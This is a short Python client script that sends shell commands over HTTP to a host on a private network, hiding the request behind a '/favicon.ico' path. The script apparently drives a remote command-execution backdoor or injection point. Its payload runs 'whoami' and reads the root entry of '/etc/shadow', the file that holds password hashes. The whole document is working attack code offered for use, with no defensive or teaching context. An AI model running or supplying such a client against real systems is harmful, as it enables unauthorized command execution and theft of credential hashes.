import requests

DEST_IP = '192.168.0.61'
DEST_PORT = 6666

URL = f'http://{DEST_IP}:{DEST_PORT}'

# DISABLE SSL before using this simple client

####################################################

r = requests.post(URL + '/favicon.ico', 'whoami;cat /etc/shadow | grep -i root')
print(r.text)